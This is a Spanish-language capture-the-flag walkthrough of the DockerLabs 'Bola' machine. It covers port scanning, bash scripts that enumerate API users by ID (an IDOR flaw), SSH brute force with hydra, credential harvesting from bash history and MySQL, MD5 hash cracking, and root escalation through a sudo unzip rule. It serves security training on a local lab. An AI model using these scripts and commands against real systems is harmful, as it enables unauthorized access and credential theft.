---
icon: flag
---

# Bola DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bola.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh bola.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 03:12 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.000072s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 4f:3f:8c:fb:88:da:ea:37:d6:9f:c3:bd:f4:8e:18:1b (ECDSA)
|_  256 2e:a1:36:ff:8b:bb:0d:b3:c8:cb:4a:81:cb:37:77:31 (ED25519)
12345/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
```

Veremos que hay un puerto que esta ejecutado por `python3` llamado `12345` que si entramos veremos la estructura de una `API` en la que no veremos nada interesante, por lo que vamos a realizar un poco de `Fuzzing` a ver si encontramos algo interesante.

## Gobuster

```shell
gobuster dir -u http://<IP>:12345/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:12345/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 405) [Size: 153]
/user                 (Status: 400) [Size: 54]
/console              (Status: 400) [Size: 167]
Progress: 197240 / 882244 (22.36%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 197492 / 882244 (22.39%)
===============================================================
Finished
===============================================================
```

Veremos que hemos encontrado `2` parametros llamados `user` y `/login`, si ponemos simplemente `/user` nos pondra que ingresemos un usuario valido a nivel de `API` y si entramos a `/login` nos pondra `Method Not Allowed` por lo que posiblemente tenga que hacerse de otra forma la peticion en vez de por `GET` por `POST`, vamos a investigar un poco.

Si en el `/login` ponemos esta estructura:

```shell
curl -X POST http://<IP>:12345/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin", "password":"admin"}'
```

Info:

```
{
  "message": "Invalid credentials"
}
```

Vemos que responde bien, por lo que ahora mismo nos interesa enumerar los usuarios para encontrar alguno y posteriormente realizar fuerza bruta en el `login` con dicho usuario, vamos a montarnos un script que haga fuerza bruta en el `/user` a ver que encontramos.

> userAttack.sh

```bash
#!/bin/bash

URL="http://<IP>:12345/user/"
WORDLIST="usuarios.txt"

echo "[*] Buscando usuarios válidos en $URL"
for user in $(cat $WORDLIST); do
    echo "[*] Probando usuario: $user"

    # Comprobar usuario en /user/
    response=$(curl -s -X POST "$URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$user\"}")

    if [[ "$response" != *"Proporciona un usuario válido"* ]]; then
        echo "[+] Usuario válido encontrado: $user"

        # Probar GET en /user/<usuario>
        echo "[*] Probando GET en /user/$user"
        curl -s -X GET "$URL$user" -o /tmp/resp.txt
        if ! grep -q "User not found" /tmp/resp.txt; then
            echo "[+] Usuario con datos: $user"
            cat /tmp/resp.txt
            exit 0
        else
            echo "[-] $user no tiene datos (User not found)"
        fi
    fi
done
```

> NOTA:

En la parte de `WORDLIST` tendremos que poner el nombre de dicho que utilicemos que tendra que estar en el mismo directorio, lo mismo con `<IP>` tendremos que poner la de la victima.

Ahora lo ejecutamos de esta forma:

```shell
chmod +x userAttack.sh
bash userAttack.sh
```

Info:

```
..............................<RESTO_CODIGO>.......................................
[*] Probando usuario: 007
[+] Usuario válido encontrado: 007
[*] Probando GET en /user/007
[+] Usuario con datos: 007
{
  "email": "george@example.com",
  "id": 7,
  "username": "george"
}
```

Veremos que ha funcionado y que ha encontrado dicho usuario, ahora tendremos que realizar fuerza bruta con dicho usuario `007` al parametro `/login`, por lo que nos montaremos otro `script`.

Pero veremos que no va a funcionar, si volvemos a pensar, vemos que tenemos en `007` tambien un identificador (`id`) vamos a ver si tambien nos puestra la informacion por `id` de esta forma:

```shell
curl http://<IP>:12345/user/7
```

Info:

```
{
  "email": "george@example.com",
  "id": 7,
  "username": "george"
}
```

Vemos que funciona, por lo que vamos a montarnos un script para obtener todos los usuarios mediante los `id` de esta forma:

> idAttack.sh

```bash
#!/bin/bash

URL="http://<IP>:12345/user"  # Sustituye <IP> por la IP real

echo "[*] Enumerando usuarios por ID..."

for id in $(seq 1 100); do
    echo "[*] Probando ID: $id"
    response=$(curl -s "$URL/$id")

    # Comprueba si hay un username en la respuesta
    if [[ "$response" == *"username"* ]]; then
        username=$(echo "$response" | grep -oP '"username":\s*"\K[^"]+')
        echo "[+] Usuario encontrado: ID=$id, username=$username"
    else
        echo "[-] No hay usuario con ID: $id"
    fi
done
```

```shell
bash idAttack.sh
```

Info:

```
[*] Enumerando usuarios por ID...
[*] Probando ID: 1
[+] Usuario encontrado: ID=1, username=alice
[*] Probando ID: 2
[+] Usuario encontrado: ID=2, username=bob
[*] Probando ID: 3
[+] Usuario encontrado: ID=3, username=charlie
[*] Probando ID: 4
[+] Usuario encontrado: ID=4, username=diana
[*] Probando ID: 5
[+] Usuario encontrado: ID=5, username=edward
[*] Probando ID: 6
[+] Usuario encontrado: ID=6, username=fiona
[*] Probando ID: 7
[+] Usuario encontrado: ID=7, username=george
[*] Probando ID: 8
[+] Usuario encontrado: ID=8, username=hannah
[*] Probando ID: 9
[+] Usuario encontrado: ID=9, username=ian
[*] Probando ID: 10
[+] Usuario encontrado: ID=10, username=julia
[*] Probando ID: 11
[+] Usuario encontrado: ID=11, username=kevin
[*] Probando ID: 12
[+] Usuario encontrado: ID=12, username=laura
[*] Probando ID: 13
[+] Usuario encontrado: ID=13, username=michael
[*] Probando ID: 14
[+] Usuario encontrado: ID=14, username=nina
[*] Probando ID: 15
[+] Usuario encontrado: ID=15, username=oscar
[*] Probando ID: 16
[+] Usuario encontrado: ID=16, username=paula
[*] Probando ID: 17
[+] Usuario encontrado: ID=17, username=quinn
[*] Probando ID: 18
[+] Usuario encontrado: ID=18, username=rachel
[*] Probando ID: 19
[+] Usuario encontrado: ID=19, username=steven
[*] Probando ID: 20
[+] Usuario encontrado: ID=20, username=tina
..............................<RESTO_CODIGO>.......................................
```

Vamos a crear un `wordlist` de usuarios.

> users.txt

```
alice
bob
charlie
diana
edward
fiona
george
hannah
ian
julia
kevin
laura
michael
nina
oscar
paula
quinn
rachel
steven
tina
```

Una vez echo esto vamos a probar dichos usuarios en `SSH` con un diccionario de contraseñas para probar fuerza bruta.

Pero no lo conseguiremos por lo que vamos a probar a que utilice el mismo diccionario de usuarios como contraseña.

## Escalate user steven

### Hydra

```shell
hydra -L users.txt ssh://<IP> -t 64 -I -e nsr
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-10 04:04:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 60 login tries (l:20/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: steven   password: steven
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-10 04:04:28
```

Veremos que ha funcionado por lo que nos conectaremos por `SSH`.

### SSH

```shell
ssh steven@<IP>
```

Metemos como contraseña `steven` y veremos que estaremos dentro.

Info:

```
Linux 24eda0f49f6e 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
steven@24eda0f49f6e:~$ whoami
steven
```

## Escalate user baluadmin

Vamos a ver que puertos tenemos en el sistema.

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                    Local Address:Port                      Peer Address:Port          Process          
tcp            LISTEN          0               80                            127.0.0.1:3306                           0.0.0.0:*                              
tcp            LISTEN          0               128                             0.0.0.0:22                             0.0.0.0:*                              
tcp            LISTEN          0               128                             0.0.0.0:12345                          0.0.0.0:*                              
tcp            LISTEN          0               128                                [::]:22                                [::]:*
```

Si leemos el siguiente archivo de la `/home` de nuestro usuario veremos lo siguiente:

```shell
cat /home/steven/.bash_history
```

Info:

```
mysql -y steven -psteven
mysql -u steven -psteven
exit
mysql -u steven -psteven
exit
ls
unzip secretitosecretazo.zip 
ls
cp secretitosecretazo.zip /home
ls
exit
sudo -l
cd /home
ls
exit
```

Vemos cosas bastantes interesantes, por lo que vamos a probarlas en `mysql`.

```shell
mysql -h localhost -u steven -psteven
```

Info:

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 41
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Veremos que ha funcionado por lo que vamos a investigar un poco.

```mysql
show databases;
```

Info:

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| secretito          |
+--------------------+
2 rows in set (0.014 sec)
```

Veremos una `DDBB` bastante interesante llamado `secretito`, vamos a ver que tablas contiene.

```mysql
use secretito;
show tables;
```

Info:

```
+---------------------+
| Tables_in_secretito |
+---------------------+
| usuarios            |
+---------------------+
1 row in set (0.000 sec)
```

Ahora vamos a ver que contiene dicha tabla mostrando toda la informacion.

```mysql
select * from usuarios;
```

Info:

```
+----+-----------+----------------------------------+
| id | usuario   | password                         |
+----+-----------+----------------------------------+
|  1 | alice     | 8bdffaa69d328c1d4ae3aeadc97de223 |
|  2 | bob       | d8578edf8458ce06fbc5bb76a58c5ca4 |
|  3 | charlie   | e99a18c428cb38d5f260853678922e03 |
|  4 | baluadmin | aa87ddc5b4c24406d26ddad771ef44b0 |
|  5 | diana     | e10adc3949ba59abbe56e057f20f883e |
+----+-----------+----------------------------------+
5 rows in set (0.000 sec)
```

Veremos que estamos viendo los `hashes` en formato `MD5`, pero el que nos interesa es el del usuario `baluadmin` que esta registrado en el sistema, por lo que vamos a decodificarlo en la siguiente pagina:

URL = [Decode Page MD5](https://10015.io/tools/md5-encrypt-decrypt)

Si lo decodificamos veremos lo siguiente:

```
baluadmin:aa87ddc5b4c24406d26ddad771ef44b0
```

Info:

```
baluadmin:estrella
```

Vamos a probarlas de esta forma en el servidor.

```shell
su baluadmin
```

Metemos como contraseña `estrella` y veremos que estamos dentro.

Info:

```
baluadmin@24eda0f49f6e:/home/steven$ whoami
baluadmin
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for baluadmin on 24eda0f49f6e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User baluadmin may run the following commands on 24eda0f49f6e:
    (ALL) NOPASSWD: /usr/bin/unzip
```

Veremos que podemos ejecutar `unzip` como el usuario `root` por lo que podremos hacer lo siguiente.

Acordemonos de que en el `.bash_history` de la `/home` del usuario `steven` vimos este `.zip`.

```
secretitosecretazo.zip
```

Por lo que vamos a buscarlo.

```shell
find / -name "secretitosecretazo.zip" 2>/dev/null
```

Info:

```
/secretitosecretazo.zip
```

Vemos que esta en la propia raiz (`/`), por lo que vamos a descomprimirlo utilizando `sudo`.

```shell
sudo unzip /secretitosecretazo.zip
```

Info:

```
Archive:  /secretitosecretazo.zip
 extracting: sorpresitajiji.txt
```

Vemos que obtenemos el archivo llamado `sorpresitajiji.txt` y si lo leemos veremos lo siguiente:

```
root:pedazodepasswordchaval
```

Vamos a probar dicha credencial para el usuario `root`.

```shell
su root
```

Metemos como contraseña `pedazodepasswordchaval`...

```
root@a71e5c97925e:/home/baluadmin# whoami
root
```

Veremos que ha funcionado, por lo que seremos el usuario `root` y habremos terminado la maquina.
